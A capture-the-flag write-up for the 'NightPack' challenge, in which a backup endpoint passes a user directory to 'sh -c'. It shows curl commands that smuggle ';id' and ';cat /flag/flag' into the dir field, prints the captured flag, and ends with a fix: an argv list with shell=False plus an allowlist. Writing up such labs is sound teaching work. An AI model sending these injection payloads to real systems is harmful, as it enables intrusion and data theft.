# NightPack - OS command injection via a shell-string argument slot

| | |
|---|---|
| **Challenge** | NightPack |
| **Category** | INJ |
| **Points / Difficulty** | 150 / medium |
| **Target** | http://inj5.chal.deti:8044 |
| **Bug** | CWE-78 - OS command injection (argument reached through `sh -c`) |

## Hint
> Pack the shelves each night; the packer hears two voices when one word splits the line.

## Recon
`POST /backup` (field `dir`, default `catalog`). The tool runs a fixed archiver
on your directory via a **shell string** (`sh -c "archiver … <dir> > …"`) and
reflects the output. No blacklist - a plain `;` splits it into a second command.

## Approach
The program name being fixed doesn't matter: the whole string goes to a shell,
which doesn't know which part is "the program." A `;` after a valid dir runs the
archiver, then our command:
```
dir = catalog;cat /flag/flag
```

## Exploitation
```bash
curl -s --data-urlencode "dir=catalog;id" http://inj5.chal.deti:8044/backup        # uid=1000(ctf)
curl -s --data-urlencode "dir=catalog;cat /flag/flag" http://inj5.chal.deti:8044/backup | grep -oE 'flag\{[^}]*\}'
```

## Flag
```
flag{114661bc7af65621c0d2062064eb8ee3}
```

## For the report
- **Payload shape:** `catalog;<command>` - valid dir, then `;`, then arbitrary
  command; outputs of both appear in the one result box.
- **Why the fixed program name doesn't save you:** the code hands the *entire
  string* to `sh -c`, so the shell re-parses it; `;` is a command separator
  regardless of what the first program is.
- **Fix:** invoke the archiver with an **argument list, no shell**
  (`subprocess.run([archiver, "-czf", archive, dir], shell=False)`) - then `;` is
  just a harmless character inside a path. Add a **directory allowlist**, because
  "the user may name any directory" is a second, quieter flaw.

## Root cause & remediation
- **Cause:** attacker-controlled argument interpolated into a `sh -c` string
  (CWE-78).
- **Fix:** argv list + `shell=False`; allowlist/validate the directory; run the
  backup job unprivileged and keep the flag off the app host.
